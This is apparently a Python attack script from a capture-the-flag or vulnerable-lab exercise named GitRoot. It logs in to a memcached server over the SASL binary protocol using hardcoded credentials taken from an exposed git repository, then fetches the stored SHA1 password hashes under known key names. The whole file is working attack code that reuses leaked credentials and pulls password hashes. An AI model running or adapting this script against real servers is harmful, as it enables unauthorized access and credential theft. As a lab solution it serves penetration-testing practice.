#!/usr/bin/env python3
"""Dump the GitRoot memcached password hashes over the SASL binary protocol.

memcached 1.5.x enforces SASL and has `cachedump` disabled, so keys cannot be
enumerated. The key names come from the file recovered from the exposed /.git
repo (pablo_S3cret_P@ss / beth_S3cret_P@ss / jen_S3cret_P@ss); their values are
SHA1 password hashes.

SASL credentials (pablo@gitroot / ihjedpvqfe) were recovered from the git
history of repo.gitroot.vuln.

Usage: python3 memcached_dump.py <host> [port]
"""
import socket
import struct
import sys

USER = "pablo@gitroot"
PW = "ihjedpvqfe"
KEYS = ["pablo_S3cret_P@ss", "beth_S3cret_P@ss", "jen_S3cret_P@ss"]


def pack(op, key=b"", val=b"", extra=b""):
    return struct.pack(">BBHBBHIIQ", 0x80, op, len(key), len(extra), 0, 0,
                       len(key) + len(val) + len(extra), 0, 0) + extra + key + val


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.122.243"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11211

    s = socket.socket()
    s.settimeout(5)
    s.connect((host, port))

    def recvn(n):
        b = b""
        while len(b) < n:
            d = s.recv(n - len(b))
            if not d:
                raise EOFError
            b += d
        return b

    def resp():
        hdr = recvn(24)
        _, _, keylen, extlen, _, status, bodylen, _, _ = struct.unpack(">BBHBBHIIQ", hdr)
        body = recvn(bodylen) if bodylen else b""
        return status, body[extlen + keylen:]

    # SASL PLAIN auth
    s.sendall(pack(0x21, b"PLAIN", b"\x00" + USER.encode() + b"\x00" + PW.encode()))
    status, _ = resp()
    if status != 0:
        print("[!] SASL auth failed")
        sys.exit(1)

    for key in KEYS:
        s.sendall(pack(0x00, key.encode()))
        status, val = resp()
        if status == 0:
            print(f"{key} => {val.decode(errors='replace')}")
        else:
            print(f"{key} => <not found>")
    s.close()


if __name__ == "__main__":
    main()
